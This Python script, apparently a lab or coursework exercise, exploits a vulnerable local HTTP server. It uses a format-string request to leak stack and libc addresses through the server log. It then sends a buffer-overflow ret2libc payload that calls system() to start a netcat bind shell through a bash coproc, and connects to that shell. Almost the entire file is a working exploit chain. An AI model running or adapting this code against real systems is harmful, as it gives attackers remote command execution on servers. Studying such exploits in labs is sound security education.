#!/usr/bin/env python

from struct import pack
from struct import unpack 
from console import console
import sys
import socket
import time

def send_cmd(cmd, port, opt):

	sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))
	sock.sendall(cmd)
	last = ""
	#the infinite loop is only required for first 2 connections
	if opt == 1:
		while True:
    			buf = sock.recv(1024)
    			if buf:
				last = buf
			else:
        			break
    			#sys.stdout.write(buf)

	sock.close()
	return last

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT LISTEN_PORT" % sys.argv[0])

port = int(sys.argv[1])

#First command exploits format string vulnerability
cmd = "GET ";

#for i in range(0, 20):
#	cmd += "%"+str(i+1)+"$08x."

cmd += pack('<I', 0x0804b7e4) 

#0x0804b7e4 is the 20th argument
#cmd += "%20$s"

#with respect to snprintf, ebp is the 1168th argument
cmd += "%1168$08x%20$s"
cmd += " HTTP/1.1\r\n\r\n"

 
buf = send_cmd(cmd, port, 1)

time.sleep(1)

#Second command fetches server.log
cmd = "GET /server.log HTTP/1.1\r\n\r\n";
 
buf = send_cmd(cmd, port, 1)

lines = buf.split("\n")
last = lines[len(lines)-2]

ebp = last[52:60]
ebp_addr = int(ebp, 16)

#retrieving the address of snprintf in hex
snprintf_Msb = last[63].encode("hex")
snprintf_msb = last[62].encode("hex")
snprintf_lsb = last[61].encode("hex")
snprintf_Lsb = last[60].encode("hex")

snprintf = str(snprintf_Msb)+str(snprintf_msb)+str(snprintf_lsb)+str(snprintf_Lsb)

#libc load address is snprintf - snprintf_offset read from readelf
libc = int(snprintf, 16) - 0x4e480

################ fixed.py
#exit and system addresses are computed from start address of libc plus their offset from readelf
exit_addr = libc + 0x000337b0
system_addr = libc + 0x00041080	

#address of system argument is computed from ebp value
system_arg = ebp_addr - 0x12a8	

cmd = "GET /index.html "
p = ""
	
for x in range(0, 115):
	p += "a"
	
p += pack('<I', ebp_addr) # overwritten ebp	
p += pack('<I', system_addr) # system
p += pack('<I', exit_addr) # exit (called after system)
p += pack('<I', system_arg) # pointer to system argument
p += pack('<I', ebp_addr) # valid pointer on stack
p += pack('<I', ebp_addr) # valid pointer on stack

p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "
p += sys.argv[2]
p += " <&${p[0]} >&${p[1]}' #"
	
p += "\r\n\r\n"
	
cmd += p 
	
send_cmd(cmd, port, 0)

#to give time to the server to call nc
time.sleep(1)

#bind shell is on LISTEN_PORT
port = int(sys.argv[2])
sock_bind = socket.create_connection(('127.0.0.1', port),
                                     socket.getdefaulttimeout(),
                                     ('127.0.0.1', 0))

console(sock_bind)
